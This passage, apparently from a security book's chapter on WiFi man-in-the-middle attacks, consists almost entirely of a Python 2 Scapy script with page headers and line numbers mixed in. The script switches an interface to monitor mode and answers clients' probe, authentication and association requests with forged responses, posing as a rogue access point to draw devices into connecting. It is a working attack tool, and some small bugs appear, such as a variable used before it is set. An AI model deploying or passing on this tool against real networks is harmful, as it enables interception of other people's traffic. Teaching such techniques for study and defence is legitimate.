 #!/usr/bin/python 2 3 import os 4 import sys 5 import time 6 import getopt 7 from scapy.all import * 8 9 iface = "wlan0" 10 ssid_filter = [] 11 client_addr = None 12 mymac = "aa:bb:cc:aa:bb:cc" 13 14 15 # Extract Rates and ESRates from ELT header 16 def get_rates(packet): 17 rates = "\x82\x84\x0b\x16" 18 esrates = "\x0c\x12\x18" 19 20 while Dot11Elt in packet: 21 packet = packet[Dot11Elt] 22 23 if packet.ID == 1: 24 rates = packet.info 25 26 elif packet.ID == 50: 27 esrates = packet.info 28 29 packet = packet.payload 30 31 return [rates, esrates] 32 33 34 def send_probe_response(packet): 35 ssid = packet.info 36 rates = get_rates(packet) 37 channel = "\x07" 38 39 if ssid_filter and ssid not in ssid_filter: 40 return
130 8 Wiﬁ Fun
41 42 print "\n\nSending probe response for " + ssid + \ 43 " to " + str(packet[Dot11].addr2) + "\n" 44 45 # addr1 = destination, addr2 = source, 46 # addr3 = access point 47 # dsset sets channel 48 cap="ESS+privacy+short-preamble+short-slot" 49 50 resp = RadioTap() / \ 51 Dot11(addr1=packet[Dot11].addr2, 52 addr2=mymac, addr3=mymac) / \ 53 Dot11ProbeResp(timestamp=time.time(), 54 cap=cap) / \ 55 Dot11Elt(ID=’SSID’, info=ssid) / \ 56 Dot11Elt(ID="Rates", info=rates[0]) / \ 57 Dot11Elt(ID="DSset",info=channel) / \ 58 Dot11Elt(ID="ESRates", info=rates[1]) 59 60 sendp(resp, iface=iface) 61 62 63 def send_auth_response(packet): 64 # Dont answer our own auth packets 65 if packet[Dot11].addr2 != mymac: 66 print "Sending authentication to " + packet[Dot11].addr2 67 68 res = RadioTap() / \ 69 Dot11(addr1=packet[Dot11].addr2, 70 addr2=mymac, addr3=mymac) / \ 71 Dot11Auth(algo=0, seqnum=2, status=0) 72 73 sendp(res, iface=iface) 74 75 76 def send_association_response(packet): 77 if ssid_filter and ssid not in ssid_filter: 78 return 79 80 ssid = packet.info 81 rates = get_rates(packet) 82 print "Sending Association response for " + ssid + \ 83 " to " + packet[Dot11].addr2 84 85 res = RadioTap() / \ 86 Dot11(addr1=packet[Dot11].addr2,
8.14 Wiﬁ Man-in-the-Middle 131
87 addr2=mymac, addr3=mymac) / \ 88 Dot11AssoResp(AID=2) / \ 89 Dot11Elt(ID="Rates", info=rates[0]) / \ 90 Dot11Elt(ID="ESRates", info=rates[1]) 91 92 sendp(res, iface=iface) 93 94 95 # This function is called for every captured packet 96 def handle_packet(packet): 97 sys.stdout.write(".") 98 sys.stdout.flush() 99 100 if client_addr and packet.addr2 != client_addr: 101 return 102 103 # Got probe request? 104 if packet.haslayer(Dot11ProbeReq): 105 send_probe_response(packet) 106 107 # Got authenticaton request 108 elif packet.haslayer(Dot11Auth): 109 send_auth_response(packet) 110 111 # Got association request 112 elif packet.haslayer(Dot11AssoReq): 113 send_association_response(packet) 114 115 116 def usage(): 117 print sys.argv[0] 118 print """ 119 -a <addr> (optional) 120 -i <interface> (optional) 121 -m <source_mac> (optional) 122 -s <ssid1,ssid2> (optional) 123 """ 124 sys.exit(1) 125 126 127 # Parsing parameter 128 if len(sys.argv) == 2 and sys.argv[1] == "--help": 129 usage() 130 131 try: 132 cmd_opts = "a:i:m:s:"
132 8 Wiﬁ Fun
133 opts, args = getopt.getopt(sys.argv[1:], cmd_opts) 134 except getopt.GetoptError: 135 usage() 136 137 for opt in opts: 138 if opt[0] == "-a": 139 client_addr = opt[1] 140 elif opt[0] == "-i": 141 iface = opt[1] 142 elif opt[0] == "-m": 143 my_mac = opt[1] 144 elif opt[0] == "-s": 145 ssid_filter = opt[1].split(",") 146 else: 147 usage() 148 149 os.system("iwconfig " + iface + " mode monitor") 150 151 # Start sniffing 152 print "Sniffing on interface " + iface 153 sniff(iface=iface, prn=handle_packet) 